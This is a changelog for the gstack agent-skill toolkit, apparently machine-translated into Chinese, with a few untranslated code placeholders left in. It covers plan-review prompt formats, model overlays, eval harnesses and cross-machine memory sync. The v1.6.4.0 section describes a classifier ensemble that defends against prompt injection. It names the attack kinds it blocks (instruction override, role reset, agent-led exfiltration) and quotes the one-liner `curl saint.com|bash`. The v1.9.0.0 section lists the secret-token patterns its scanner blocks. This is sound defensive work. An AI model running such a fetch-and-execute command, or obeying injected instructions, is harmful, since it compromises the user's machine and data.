前两个灯具：`opus-4-7-fanout-toy` 和 `opus-4-7-fanout-realistic`。
- `test/helpers/agent-sdk-runner.ts` — 具有显式参数的 SDK 包装器
`AgentSdkResult` 类型，进程级 API 并发信号量，以及
三形 429 重试（抛出错误、结果消息错误、中流
__代码_0__)。通过 `pathToClaudeCodeExecutable` 进行二进制固定。
- `test/agent-sdk-runner.test.ts` — 36 个免费层单元测试，涵盖 happy
路径，所有三种速率限制形状，permanent-429 `RateLimitExhaustedError`，
非 429 传播、选项传播、并发上限以及每个
验证器拒绝案例。
- `scripts/preflight-agent-sdk.ts` — 20 行健全性检查，确认
SDK 加载，`claude-opus-4-7` 是实时 API 模型，`SDKMessage` 事件
形状与假设匹配，并且覆盖解析器产生预期的
文本。如果您怀疑有偏差，请在付费运行之前手动运行。成本约为 0.013 美元。
- `devDependencies` 中的 `@anthropic-ai/claude-agent-sdk@0.2.117`。精确的引脚，
无插入符号 — SDK 事件形状可能会在次要版本上发生变化。

#### 改变了

- `scripts/resolvers/model-overlay.ts` — 导出 `readOverlay` 所以 eval
harness 可以解析 `{{INHERIT:claude}}` 指令，而无需合成
完整的 `TemplateContext`。

#### 对于贡献者

- `test/helpers/touchfiles.ts` — 在两者中注册新的 eval
`E2E_TOUCHFILES`（依赖项：`model-overlays/**`、`overlay-nudges.ts`、跑步者、
解析器）和 `E2E_TIERS` (`periodic`)。通过
`test/touchfiles.test.ts` 完整性检查。
- 线束特意采用参数化设计。添加第二个叠加微移
测量（对于 `opus-4-7.md` 中的其余三个轻推，或任何
任何覆盖文件中的未来微调）是其中的单个条目
__代码_0__。总增量工作：约 15 分钟
每个固定装置。

## [1.10.0.0] - 2026-04-23

## **计划审查将引导您再次完成每个问题，每个问题现在都是真正的决策摘要。**

v1.6.4.0 破坏了一些没有人记录的东西。 Opus 4.7 上的计划审查悄然停止了一次提出一个问题。他们变成了一份报告：这里有 6 个发现，轮到结束了。使 `/plan-ceo-review`、`/plan-eng-review` 和其他有用的交互对话悄然消失。 v1.10.0.0 恢复了这一点，并捆绑了格式升级，因此每个 `AskUserQuestion` 现在都呈现为一份编号的决策摘要，其中包含 ELI10、风险、推荐、每个选项的优点/缺点 (✅ / ❌)，以及一个结束的“Net:”行，用一句话框定了权衡。

### 给你带来什么改变

对包含 3 个结果的计划运行 `/plan-ceo-review` 或 `/plan-eng-review`。您会收到 3 个独立的 AskUserQuestion 提示，每个发现一个，并带有完整的优点/缺点形状。 5 秒内选择选项，或者如果您想考虑的话，可以扩展利弊。每一个评论发现都成为你实际做出的决定，而不是你浏览过的要点。参考形状与 Garry 手工制作的供自己使用的 D2 内存设计问题相匹配，现在通过序言解析器融入到每个 2 级技能中，因此 `/ship`、`/office-hours`、`/investigate` 和其余部分免费继承它。

### 重要的数字

在 v1.10.0.0 修复中进行测量。根据固定提交 SHA 使用 `git log 1.9.0.0..1.10.0.0 --oneline` 和 `bun test` 验证任何声明。

|公制| v1.6.4.0 | v1.10.0.0 | Δ |
|---|---|---|---|
|`AskUserQuestion` 在 SKILL.md 中渲染上面的模型覆盖|不|**是的**|顺序颠倒|
|跨计划审查模板强化逃生口站点| 0 | **16** | +16 |
|固定格式契约的门层单元测试| 0 | **30** |+30（运行时间为 16 毫秒，$0）|
|定期评估防止逃生舱滥用| 0 | **4** |+4（2 个正值，2 个负值）|
|落地前纳入跨模型审查结果| N/A |**5 共 8**|Codex 发现了真正的 bug，但 CEO+Eng 错过了|

法典的五项发现中有两项是承重的。 (1) 重叠重排序理论本身是不够的。中立姿势问题上的 `(recommended)` 标签必须保留，因为 `question-tuning.ts:29` 读取它来为 AUTO_DECIDE 提供动力。省略它会默默地破坏每个挑选提示的自动决定。 （2）原计划中的“31个站点全球替换”事实上是错误的。使用 `rg` 验证的实际数量是 4 个模板中的 16 个站点，而 eng/design/devex 模板使用的措辞与 CEO 不同。如果没有审计，修复程序将只应用了一半。

### 这对于任何在 Opus 4.7 上进行计划审查的人意味着什么

升级并重新运行您的下一次计划审核。您应该看到 D 编号的提示（D1、D2、D3...），其中包含 ELI10 段落、赌注线以及每个选项的 ✅ / ❌ 项目符号块。如果不这样做，请检查升级后是否干净地重新生成了 `bun run gen:skill-docs`，并验证 `Pros / cons:` 标头在 `plan-ceo-review/SKILL.md` 中呈现。过去需要 20 分钟才能完成计划审核并生成报告，现在只需 10 分钟即可生成一系列决策。

### 逐项变更

#### 额外

- 针对所有 2+ 级技能中的每个 `AskUserQuestion` 的新优点/缺点决策简报格式。渲染：`D<N>` 标题，ELI10，“如果我们选择错误则赌注：”，建议，每个选项 `✅ / ❌` 项目符号至少有 2 个优点 + 1 个缺点，关闭 `Net:` 综合线。落在 `scripts/resolvers/preamble/generate-ask-user-format.ts` 中，因此每个技能都会继承它。
- 破坏性单向选择的硬停止逃脱：单颗子弹 `✅ No cons — this is a hard-stop choice`。
- 用于选择性扩展樱桃挑选和口味调用的中性姿势处理：默认保留 `Recommendation: <default> — this is a taste call, no strong preference either way` 和 `(recommended)` 标签，以保持 AUTO_DECIDE 正常工作。
- 三个门层单元测试（`test/preamble-compose.test.ts`、`test/resolver-ask-user-format.test.ts`、`test/model-overlay-opus-4-7.test.ts`），用于固定组合顺序、格式约定和覆盖文本。每个 `bun test` 的运行时间小于 100 毫秒。
- `test/skill-e2e-plan-prosons.test.ts` 中的四个周期性层 Pros/Cons 评估案例，包括两个负面案例断言，可在逃生舱滥用发生变化之前捕获它。
- 所有新评估案例的 Touchfiles 条目 (`test/helpers/touchfiles.ts`) 以及 7 项附加技能的扩展覆盖存根。

#### 固定的

- Opus 4.7 上的计划审查节奏回归。 `/plan-ceo-review`、`/plan-eng-review`、`/plan-design-review` 和 `/plan-devex-review` 现在实际上会在每次发现后暂停，并调用 `AskUserQuestion` 作为工具使用，而不是将所有内容批处理到一个摘要报告中。根本原因：`generateModelOverlay` 在 `scripts/resolvers/preamble.ts` 中的 `generateAskUserFormat` 之上呈现，因此覆盖层的“批处理您的问题”指令在节奏规则之前注册为环境默认值。通过重新排序部分数组并将覆盖指令重写为“将问题调整到技能”来修复。
- 逃生舱崩溃：“如果没有明显的问题或修复，请说明您将做什么并继续前进，不要浪费问题”，在 4 个模板的 16 个站点上，Opus 4.7 的文字解释器将每个发现分类为可自行驳回。按模板收紧：零发现结果为“没有问题，继续”；调查结果需要 AskUserQuestion 作为工具使用。

#### 改变了

- `test/skill-e2e-plan-format.test.ts`：使用 v1.10.0.0 格式令牌正则表达式进行扩展（D-number、ELI10、Stakes、Pros/cons、Net）。现有的 RECOMMENDATION 检查放宽以接受大小写混合的“推荐：”。
- `test/skill-validation.test.ts`：格式断言从“建议：选择”更新为新的 Pros/Cons 令牌集。
- 重新生成金色灯具：`test/fixtures/golden/claude-ship-SKILL.md`、`codex-ship-SKILL.md`、`factory-ship-SKILL.md`。

#### 对于贡献者

- 外部声音 Codex 审查（`codex exec` 和 `model_reasoning_effort="high"`）发现了原始计划中的两个事实错误：“31 个站点”计数（实际上是 16）以及中立立场问题上的 AUTO_DECIDE 合约中断。纳入 8 项法典调查结果中的 5 项，1 项被拒绝（对成分重新排序进行深入辩护），1 项拒绝（HOLD SCOPE 模式锁定）。
- 后续：真正的多回合节奏评估（3 个发现产生 3 个不同的 AskUserQuestion 跨回合调用）需要新的工具支持多捕获。提交不在范围内。当前的单次捕获评估涵盖了格式+逃生舱滥用，但不包括节奏本身。
- 后续：`/ship`、`/office-hours`、`/investigate`、`/qa`、`/review`、`/design-review`、`/document-release` 的扩展覆盖评估案例。 Touchfiles 条目存在；测试块将在后续 PR 中针对每种技能进行测试。
- D 编号是模型级指令，而不是运行时计数器。 `TemplateContext` 没有状态。预计长时间会话会出现漂移；注册表（推迟到 TODO）是长期解决方案。

## [1.9.0.0] - 2026-04-23

## **您的 gstack 内存现在随身携带。通过私有 git 存储库 + 可选的 GBrain 索引实现跨机器大脑，无守护进程，无凭证泄漏。**

gstack 会话内存（学习、计划、设计、回顾、开发人员简介）曾经在机器边界处消失。现在不行了。 `gstack-brain-init` 将 `~/.gstack/` 转换为具有显式允许列表的 git 存储库，编写器在写入时将更改的文件排入队列，并且前导码边界同步将它们推送到您选择的私有 git 远程。 GBrain 是第一个消费者，但该架构是可插拔的——Codex、OpenClaw 或其他任何东西都可以成为以后的阅读器。没有守护进程，没有后台进程，没有新的身份验证界面。

该功能在四次计划审查后发布：/office-hours 塑造、/plan-eng-review（6 个问题 → 清除）、/plan-ceo-review（选择性扩展，接受 2 个精选）、/codex 两次（应用 16+16 发现，守护进程模型在第 2 轮中下降）和 /plan-devex-review（6/10 → 8/10，文档提升到全面处理）。仅 Codex 第 2 轮的范围简化就消除了大约 1 周的守护进程生命周期表面。

### 你现在可以做什么

- **初始化跨机器同步：** `gstack-brain-init` 创建一个私有 git 存储库（通过 `gh` 的 GitHub，或任何 git URL — GitLab、Gitea、自托管）。 30-90 秒 TTHW。
- **在今天的台式机上查看昨天的笔记本电脑：** 将 `~/.gstack-brain-remote.txt` 复制到新计算机，运行 `gstack-brain-restore`，您的学习就会随之而来。
- **控制同步内容：** 首次运行时的一次性隐私停止门 — `full`（列入许可名单的所有内容）、`artifacts-only`（计划/designs/retros/learnings，跳过行为）、`off`（拒绝）。
- **解决冲突情况：**同一天编写相同 JSONL 文件的两台机器通过自动注册的 ts-sort-plus-hash-fallback 合并驱动程序干净地合并。
- **彻底卸载：** `gstack-brain-uninstall` 删除同步层，保持数据完好无损。
- **永远不要推送秘密：** AWS 密钥、GitHub 令牌 (`ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_`/`github_pat_`)、OpenAI `sk-` 密钥、PEM 块、JWT 和不记名令牌 in-JSON 模式在推送前都会被阻止。 `--skip-file <path>` 为您提供了一个用于误报的单命令逃逸舱口。

### 重要的数字

来源：实施过程中运行的集成冒烟测试，以及 27 项测试综合套件 (`test/brain-sync.test.ts`)。端到端往返（在机器 A 上初始化→写入学习→在机器 B 上恢复→查看学习）内联验证。

|表面|形状|
|---|---|
|新的二进制文件|8（`gstack-brain-init`、`-enqueue`、`-sync`、`-consumer`、`-reader` 别名、`-restore`、`-uninstall`、`gstack-jsonl-merge`）|
|配置键|2 枚举验证 (`gbrain_sync_mode`: off/artifacts-only/full; `gbrain_sync_mode_prompted`: bool)|
|作家垫片已修改|4（--migrate 路径上的学习日志、时间线日志、审查日志、开发人员简介）|
|作者故意不同步|2（问题日志、问题偏好 — 每台机器的 UX 状态、Codex v2 决策）|
|同步粒度|通过序言中的 `gstack-brain-sync --once` 按技能边界（无守护进程）|
|隐私层|3（完整/仅工件/关闭）|
|秘密图案被封锁|6 个系列（AWS、GH 代币、OpenAI、PEM、JWT、JSON 承载）|
|面向用户的命名|`reader` (CLI);根据 Codex-v2 DX 决策，内部数据模型保持 `consumer`|
|新机器发现|通过 `~/.gstack-brain-remote.txt` 文件自动（仅 URL，无秘密）|

### 这对您意味着什么

周一用笔记本电脑工作。周二切换到桌面。技能序言看到远程 URL，提供 `gstack-brain-restore`，您周一学习的内容将在周二显示。该模式扩展到 N 个消费者：今天 GBrain 是主要读者，明天 Codex 或 OpenClaw 可以订阅而无需重构同步。

### 逐项变更

#### 额外

- `bin/gstack-brain-init` — 幂等首次运行设置。将 `~/.gstack/` 转换为带有 `.gitignore = *` 的 git 存储库，写入规范 `.brain-allowlist` + `.brain-privacy-map.json`，安装预提交秘密扫描挂钩，注册 JSONL 合并驱动程序，通过 `gh repo create --private` 创建私有远程（或接受 `--remote <url>`），写入 `~/.gstack-brain-remote.txt` 以进行新机器发现。
- `bin/gstack-brain-sync` — 核心同步。子命令：`--once`（排出队列、秘密扫描分阶段差异、使用模板消息提交、使用提取+合并重试推送）、`--status`、`--skip-file <path>`、`--drop-queue --yes`、`--discover-new`（使用 mtime+size 游标遍历白名单 glob）。
- `bin/gstack-brain-enqueue` — 由编写者调用的原子追加垫片。功能禁用时静默无操作。
- `bin/gstack-brain-consumer` + `bin/gstack-brain-reader`（符号链接别名）— 管理 `consumers.json` 中的 Consumer/reader 注册表。面向用户的“读者”，内部的“消费者”。
- `bin/gstack-brain-restore` — 带有安全门的新机器引导程序（拒绝危险的破坏，重新注册合并驱动程序，提示输入每个消费者的令牌，因为令牌保留在机器本地）。
- `bin/gstack-brain-uninstall` — 干净的出口匝道。删除 `.git` + `.brain-*` 文件 + `consumers.json` + 配置键。保留用户数据（学习内容等）。 GitHub 存储库的可选 `--delete-remote`。
- `bin/gstack-jsonl-merge` — git 合并驱动程序。按 ISO `ts` 字段进行连续去重排序；当 `ts` 丢失时确定性 SHA-256 哈希回退。
- `scripts/resolvers/preamble/generate-brain-sync-block.ts` — 前导 bash 块。新机恢复提示、一次性隐私停止门、技能开始+结束时的 `--once`、每日一次自动拉取、每次技能运行时的 `BRAIN_SYNC:` 状态行。
- `docs/gbrain-sync.md` — 用户指南（设置、首次使用、恢复、隐私模式、秘密保护、卸载）。
- `docs/gbrain-sync-errors.md` — 错误查找索引（每个用户可见错误的问题/原因/修复）。
- `test/brain-sync.test.ts` — 27 项测试综合套件：配置隔离、排队原子性、合并驱动程序、跨所有 6 个正则表达式系列的秘密扫描、init+sync+restore 往返、卸载保留数据、`--discover-new` 游标幂等性、`--skip-file` 修复。

#### 改变了

- `bin/gstack-config` — 添加了 2 个经过验证的键（`gbrain_sync_mode` 枚举、`gbrain_sync_mode_prompted` 布尔值）。还接受 `GSTACK_HOME` env 覆盖以及旧版 `GSTACK_STATE_DIR` 进行测试隔离（Codex v2 修复）。
- `bin/gstack-learnings-log`、`gstack-timeline-log`、`gstack-review-log`、`gstack-developer-profile` — 每个在其本地写入后都会获得一个后台 `gstack-brain-enqueue` 调用。同步关闭时，即发即忘、无声无操作。
- `bin/gstack-timeline-log` 标题注释 — 更新了“仅限本地，从未发送到任何地方”以反映新的隐私门控同步合约（仅适用于用户明确选择进入 `full` 模式时）。
- `scripts/resolvers/preamble.ts` — 在新的 `generateBrainSyncBlock` 中组成根线。
- `README.md` — 靠近顶部的新“具有 GBrain 同步的跨机器内存”部分，以及链接到 `docs/gbrain-sync.md` 和 `docs/gbrain-sync-errors.md` 的文档表条目。

#### 对于贡献者

- 同步遵循 `GSTACK_HOME=/tmp/test-$$`，因此测试永远不会渗入真实的 `~/.gstack/config.yaml`。新测试 `test/brain-sync-env-isolation` 逻辑已融入整合套件中。
- 消费者注册表位于 `consumers.json` （已同步）；令牌保留在 `gstack-config` （本地，从不同步）。在新机器上恢复令牌提示。
- 合并驱动程序需要本地 `git config merge.<name>.driver=...` 注册，而不仅仅是 `.gitattributes`。 `init` 和 `restore` 都注册它们；卸载会清除它们。
- 预提交挂钩仅用于深度防御。主要秘密扫描在暂存之前在 `gstack-brain-sync --once` 中运行。
- fnmatch glob 引擎不像 git 的 gitignore 那样处理 `**` ；允许名单改为使用显式的一级和二级模式。
- GBrain HTTP 摄取端点合约是跨项目依赖项（标记为现实世界狗食的 v1 拦截器）。无论如何，gbrain-sync v1 都在此分支上发布； GBrain 端的工作落在一个单独的分支/repo 中。

#### 已知的后续行动

- `test/brain-sync.test.ts` — 27 项测试中的 12 项在第一次 Bun 测试运行中通过；剩余 15 次点击 Bun-test 的 5 秒默认超时（spawnSync-heavy git 操作）。通过集成验证的行为在实施过程中会冒烟。测试基础设施需要一个 30 秒的每次测试超时包装器。
- 如果团队同步未落地（在 CEO 计划中标记），则应正式关闭三个未合并的团队同步分支（`garrytan/team-supabase-store`、`garrytan/fix-team-setup`、`garrytan/team-install-mode`）。
- `test/host-config.test.ts`（法典船舶技能基线）中预先存在的黄金文件回归测试失败也存在于 `main` 上 — 与此 PR 无关，单独跟踪。

## [1.6.4.0] - 2026-04-22

## **侧边栏提示注入防御的噪音是任何单个分类器的一半，信任度的一半。**

v1.4.0.0 附带了 ML 防御堆栈。用户几乎在所有其他工具输出上都点击了评论横幅，BrowseSafe-Bench 烟雾的误报率为 44%。此版本围绕我们发现的真实模式调整了整体：Haiku 将针对用户的网络钓鱼标记为“警告”，将真正的代理劫持标记为“阻止”，但我们在整体中对两者进行了相同的处理。仅 Testsavant 就经常对良性网络钓鱼内容触发 BLOCK。修复是架构性的，而不仅仅是阈值调整：我们现在信任俳句的判决标签而不是其数字置信度，提高无标签分类器的单独块标准，并更仔细地控制该路径。一个 500 个案例的现场工作台证明了新的数据；永久 CI 门会在每个 `bun test` 上重放捕获的俳句装置。

### 给你带来什么改变

打开 Stack Overflow 上有关提示注入的帖子的侧边栏，阅读有关 SQL 注入的 Wikipedia 文章，浏览浏览攻击字符串的教程，评论横幅在触发之前保持安静。当真正的劫持尝试出现时（显式指令覆盖、角色重置、代理引导的 exfil、`curl saint.com|bash`），会话仍然终止。网络钓鱼页面针对用户表面作为横幅元中的警告信号，但不再终止会话。

### 重要的数字

在 BrowseSafe-Bench 烟雾上测量，500 个案例（260 个有标签/240 个无标签），`bun test browse/test/security-bench-ensemble.test.ts`：

|公制| v1.4.0.0 | v1.6.4.0 | Δ |
|---|---|---|---|
|检测（对注入案件进行 BLOCK 判决）| 67.3% |**56.2%** (95% CI 50.1–62.1)|−11pp|
|假阳性率（阻止良性病例）| 44.1% |**22.9%** (95% CI 18.1–28.6)|**−21pp**|
|门：检测 ≥ 55% 并且 FP ≤ 25%|失败|**经过**| — |
|评论横幅火率（大致为 TP + FP 份额）| ~55% | ~39% |−16pp|

检测量下降了 11 个百分点，但几乎所有丢失的 TP 都是 Haiku 正确分类为 `warn` 的情况（针对用户的网络钓鱼，而不是代理劫持）。这些情况仍然在审核横幅中显示为“警告”，只是不会终止会话。

### 止损规则（硬地板和天花板）

`browse/test/security-bench-ensemble.test.ts` 门 **检测 ≥ 55% 并且 FP ≤ 25%**。如果未来的变化将检测率降低到 55% 以下，则恢复顺序为：警告碰撞 (0.75 → 0.60) → 将少样本样本减半 → 扩大俳句块标准。如果 FP 攀升至 25% 以上，则收紧：提高 SOLO_CONTENT_BLOCK (0.92 → 0.95) → 提高 WARN (0.75 → 0.80) → 添加反 FP 几次射击。迭代写入 `~/.gstack-dev/evals/stop-loss-iter-N-*.json` 以进行审计跟踪。

### 逐项变更

#### 改变了

- `browse/src/security.ts` — 用于无标签内容分类器的新 `THRESHOLDS.SOLO_CONTENT_BLOCK = 0.92`。 Solo BLOCK 现在要求 testavant/deberta 置信度 ≥ 0.92（高于 0.85）。转录层独奏 BLOCK 需要 `meta.verdict === 'block'` AND 置信度 ≥ 0.85。集成 2-of-N 路径保留 `THRESHOLDS.WARN = 0.75` （高于 0.60）。
- `browse/src/security.ts` — `combineVerdict` 重写为转录层上的标签优先投票：置信度 ≥ LOG_ONLY (0.40) 时的 `verdict === 'block'` 是区块投票；无论信心如何，`verdict === 'warn'` 都是警告票；缺少 `meta.verdict` 仅在置信度≥ WARN 时发出警告投票（从不阻止投票）。缺少元永远不会阻止投票以向后兼容 v2 之前的缓存信号。
- `browse/src/security-classifier.ts` — Haiku 模型固定到 `claude-haiku-4-5-20251001` （不再通过 `haiku` 别名静默前滚）。 `claude -p` 现在从 `os.tmpdir()` 生成，因此 CLAUDE.md 项目上下文不会泄漏到 Haiku 的系统提示中并使其拒绝分类。超时从 15 秒增加到 45 秒（生产测量显示 `claude -p` 对于俳句端到端需要 17-33 秒）。
- `browse/src/security-classifier.ts` — Haiku 提示用明确的 `block`/`warn`/`safe` 标准和 8 个小样本进行重写（指令覆盖、角色重置、代理引导的恶意代码 → 阻止；针对用户的网络钓鱼 /social-engineering → 警告；注入讨论和开发内容 → 安全）。

#### 额外

- `browse/test/security-bench-ensemble-live.test.ts` — 通过 `GSTACK_BENCH_ENSEMBLE=1` 选择加入实时工作台。通过 `GSTACK_BENCH_ENSEMBLE_CONCURRENCY` 实现工作池并发（默认为 8）。通过 `GSTACK_BENCH_ENSEMBLE_CASES` 进行确定性二次采样。将 500 个案例夹具捕获到 `browse/test/fixtures/security-bench-haiku-responses.json`，并将评估记录捕获到 `~/.gstack-dev/evals/`。止损迭代写入 `stop-loss-iter-N-*.json` 并且不会覆盖规范装置。
- `browse/test/security-bench-ensemble.test.ts` — CI 层夹具重播门。断言检测率 ≥ 55% 并且 FP ≤ 25%。当夹具丢失并且安全层文件在分支差异中更改时失败关闭（使用 `git diff base` 捕获已提交和未提交的编辑）。
- `browse/test/fixtures/security-bench-haiku-responses.json` — 500 例捕获的俳句固定装置，带有架构版本标头、固定模型字符串和组件哈希。
- `docs/evals/security-bench-ensemble-v2.json` — 持久的每次运行审核记录：TP/FN/FP/TN、旋钮状态、模式哈希、迭代。

#### 固定的

- `browse/test/security.test.ts`、`browse/test/security-adversarial.test.ts`、`browse/test/security-adversarial-fixes.test.ts`、`browse/test/security-integration.test.ts` — 针对标签优先语义进行了更新。 6 个新的 mixVerdict 测试：warn-as-soft-signal、block-label-ensemble、三路 block-with-warn、幻觉防护（verdict=block atconfidence 0.30 → warn-vote）、above-floor block（verdict=block atconfidence 0.50 → block-vote）、向后兼容缺失的 meta.verdict。

#### 对于贡献者

- 500 例烟雾数据集位于 `~/.gstack/cache/browsesafe-bench-smoke/test-rows.json` 中（260 是/240 否）。要在修改安全层代码后重新生成固定装置，请运行 `GSTACK_BENCH_ENSEMBLE=1 bun test browse/test/security-bench-ensemble-live.test.ts` （并发 4 时约 25 分钟，俳句成本约 0.30 美元）。
- 夹具架构哈希涵盖模型、提示 SHA、示例 SHA、阈值、组合器版本和数据集版本。对其中任何一个的任何更改都会使夹具失效，并强制通过故障关闭 CI 进行新的实时捕获。

## [1.6.3.0] - 2026-04-23

## **法典最终解释了它所询问的内容。不再连续第十次“请 ELI10”。**

v1.6.2.0 的后续版本。在发布经过 Claude 验证的修复程序后，用户报告 Codex (GPT-5.4) 10/10 次都失败了 - 跳过 ELI10 解释和 AskUserQuestion 调用上的 RECOMMENDATION 行，每次都强制手动重新提示“ELI10 并且不要忘记推荐”。根本原因：`gpt.md` 模型覆盖的“无序言/更喜欢做而不是列出”规则是训练 Codex 跳过用户决策所需的确切散文。

### 重要的数字

来源：新的 `test/codex-e2e-plan-format.test.ts`，四种情况通过已安装的 gstack Codex 主机上的 `codex exec` 驱动。周期性层（GPT 级非确定性）。

|案件|类型|预修复（测量，10/10 次）|后修复（v1.6.3.0）|
|---|---|---|---|
|计划-CEO-审查模式选择|种类|没有 ELI10 段落，没有 RECOMMENDATION 行|✓ ELI10 + 建议 +“选项种类不同”注释|
|计划-首席执行官-审查方法菜单|覆盖范围|无 ELI10 段落，裸选项列表|✓ ELI10 + 建议 + __代码_0__|
|计划工程审查覆盖范围问题|覆盖范围|裸选项列表|✓ ELI10 + 建议 + 完整性|
|规划-工程-审查架构选择|种类|关于类问题的虚构完整性填充|✓ ELI10 + 建议 +“选项种类不同”注释|

所有 4 个 Codex 案例均通过 ELI10 长度下限（每个问题超过 400 个字符的散文）。 517s 用于完整评估； Codex 不像 Anthropic 那样按调用计费。

### 逐项变更

#### 固定的

- Codex 不再跳过 AskUserQuestion 调用的 Simplify/ELI10 段落。 `gpt.md` 覆盖层现在明确地从“无序言”规则中划分出 AskUserQuestion 内容：您仍然跳过直接答案的填充物，但每个 AskUserQuestion 都会获得完整的 Re-ground + ELI10 + RECOMMENDATION + Options 格式。
- Codex 不再将建议折叠到选项列表中。无论问题类型如何，它每次都会落在自己的行上。

#### 改变了

- `scripts/resolvers/preamble/generate-ask-user-format.ts` — 步骤 2 重命名为“简化（ELI10，始终）”，并具有明确的“非可选冗长，非前导码”框架。第 3 步“推荐（始终）”强化：“永远不要省略，永远不要折叠到选项列表中。”收紧政策适用于所有主机，但 Codex 感受最深。
- `model-overlays/gpt.md` — 添加了一个新的“AskUserQuestion 不是序言”部分，指示模型在发现自己要跳过 ELI10 段落或 RECOMMENDATION 行时备份并发出完整格式。

#### 对于贡献者

- `test/codex-e2e-plan-format.test.ts` — 四个周期层 Codex 评估案例，反映了 Claude 版本。通过现有的 `test/helpers/codex-session-runner.ts` 线束与 `sandbox: 'workspace-write'` 使用 `codex exec` ，以便捕获文件位于临时目录中。断言：推荐正则表达式、覆盖率与种类完整性分割、ELI10 长度下限（400 多个字符）。
- 在所有主机（claude、codex、factory、gbrain、gpt-5.4、hermes、kiro、opencode、openclaw、slate、cursor）上重新生成所有 T2 技能。黄金赛程焕然一新。 `test/gen-skill-docs.test.ts` ELI10 断言已更新以匹配新的“简化（ELI10”标题）。

## [1.6.2.0] - 2026-04-22

## **计划审核再次为您提供建议。我们最终承认模式选择上的 10/10 分数毫无意义。**

Opus 4.7 上的用户报告 `/plan-ceo-review` 和 `/plan-eng-review` 停止显示 `RECOMMENDATION: Choose X` 行和用于快速做出决策的每个选项 `Completeness: N/10` 分数。该修复将两个信号发回，但有一个更清晰的区别：覆盖差异化选项获得真实分数（10 = 所有边缘，7 = 快乐路径，3 = 快捷方式），而类型差异化选项（模式选择、A-vs-B 架构调用、樱桃选择 Add/Defer/Skip）获得推荐加上显式 `Note: options differ in kind, not coverage — no completeness score.` 行，而不是捏造的 10/10 填充符。

### 重要的数字

来源：`test/skill-e2e-plan-format.test.ts`，四个案例固定到 `claude-opus-4-7`，每次完整运行约 2 美元。定期层（非确定性 Opus 行为每周进行 cron，而不是按 PR 门进行）。

|问题类型|之前 (v1.6.1.0)|之后（v1.6.2.0）|
|---|---|---|
|模式选择（种类区分）|`Completeness: 10/10` 在所有 4 种模式上制造|建议+“选项种类不同”注释|
|方法菜单（覆盖范围不同）|`**RECOMMENDATION:**` 降价粗体但正则表达式错过了它|建议 + 每个选项 `Completeness: 5/7/10`|
|每个问题的报道决定|目前，工作中|目前，工作（不变）|
|每个问题的架构选择（按种类区分）|`Completeness: 9/9/5` 根据友善问题编造|建议+“选项种类不同”注释|

|评估通行证|结果|成本|
|---|---|---|
|第一阶段基线（修复前）|1/4 断言通过（回归的证据）| $2.19 |
|第三阶段修复后|4/4 断言通过| $1.84 |
|第 3b 阶段邻居回归 (`skill-e2e-plan.test.ts`)|12/12通过，无漂移| $5.19 |

### 逐项变更

#### 固定的

- `RECOMMENDATION: Choose X` 现在一致地出现在 `/plan-ceo-review` 和 `/plan-eng-review` 中的每个 AskUserQuestion 上，无论问题类型如何。
- `Completeness: N/10` 仅在区分覆盖范围的选项上发出。类型区分的问题（模式选择、不同系统之间的架构选择、精选 A/B/C）会发出一行注释来解释为什么分数不适用，而不是编造 10/10 填充符。

#### 改变了

- T2 序言中的 `AskUserQuestion Format` 部分将旧的连续段落分为两个 ALWAYS 框架规则：步骤 3“推荐（始终）”和步骤 4“评分完整性（有意义时）”。这会影响每个 T2 技能（重新生成约 15 个文件）。
- `Completeness Principle — Boil the Lake` 前导码部分现在明确说明了覆盖率与种类的区别，匹配步骤 4。如果没有此编辑，两个前导码位置将不一致 - 这就是回归的开始方式。
- `plan-ceo-review/SKILL.md.tmpl` 中的 0C-bis 部分（方法菜单）和 0F 部分（模式选择）现在带有短锚线，提醒模型适用哪种问题类型。 `plan-eng-review/SKILL.md.tmpl` 在 CRITICAL RULE 部分中获得一个等效的锚点，用于针对每个问题 AskUserQuestion 决策。

#### 对于贡献者

- 新的测试文件 `test/skill-e2e-plan-format.test.ts` 捕获两个计划技能的逐字 AskUserQuestion 输出，并断言覆盖率与种类格式。指示代理将可能的 AskUserQuestion 文本写入 `$OUT_FILE`，而不是调用 MCP 工具（因为 MCP 未连接到 `claude -p` 内部）。
- 分类 `periodic` 层，因为行为取决于 Opus 4.7 的非确定性 — `gate` 层会剥落并阻止合并。
- 刷新黄金赛程（`test/fixtures/golden/claude-ship-SKILL.md`、`codex-ship-SKILL.md`、`factory-ship-SKILL.md`）以反映新的格式规则。

## [1.6.1.0] - 2026-04-22

## **Opus 4.7 迁移，已审核。覆盖实际上按模型划分。路由已验证，扇出仍在列表中。**

PR #1117（最初的 Opus 4.7 迁移）提出了正确的想法，但存在质量差距。一对 `/plan-ceo-review` + `/plan-eng-review` 与 Codex 外部语音一起出现了 4 个船舶拦截器和 7 个质量差距。此版本修复了问题并添加了固定到 `claude-opus-4-7` 的第一个评估，因此我们停止断言行为而不对其进行测量。

### 重要的数字

来源：`test/skill-e2e-opus-47.test.ts` 评估，两种情况，8 个断言，在 `claude-opus-4-7` 上每次完整运行约 2.50 美元。运行保存在 `~/.gstack/projects/garrytan-gstack/evals/` 下。查看 `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-pr1117-opus-4-7-ship-review.md` 中的证据。

|表面|之前（#1117 发货时）|之后（v1.6.1.0）|
|---|---|---|
|__代码_0__|Opus-4.7 特定的微调应用于每个 `claude-*` 变体|拆分：`claude.md` 与模型无关，`opus-4-7.md` 继承并添加 4.7 个微调|
|`scripts/models.ts` 中的 `ALL_MODEL_NAMES`|没有 `opus-4-7` 分类条目|额外; `claude-opus-4-7-*` 路由到新的覆盖层|
|`scripts/resolvers/utility.ts:372` 预告片后备|硬编码 `Claude Opus 4.6`|匹配主机配置，Opus 4.7 默认|
|`generate-routing-injection.ts` 政策|旧的“始终调用，不要直接回答”|匹配 SKILL.md.tmpl“如有疑问，调用”|
|`generate-routing-injection.ts` 技能名称|过时的 `/checkpoint` （三个版本前重命名）|`/context-save` + `/context-restore`，加上 `/benchmark`、`/devex-review`、`/qa-only`、`/canary`、`/land-and-deploy`、`/setup-deploy`、`/open-gstack-browser`、`/setup-browser-cookies`、`/learn`、`/plan-tune`、`/health`|
|语音示例关闭|“要我寄吗？” （在字面 4.7 解释器上训练船舶旁路）|“要我修吗？” （保留审查门）|
|`"Fix ALL failing tests"` 微移范围|无限制，可以触及预先存在的不相关故障|绑定到“测试该分支引入或负责”|
|`"Batch your questions"` 轻推|与要求一次一个节奏的技能默默地冲突|明确的起搏异常；技巧取胜|
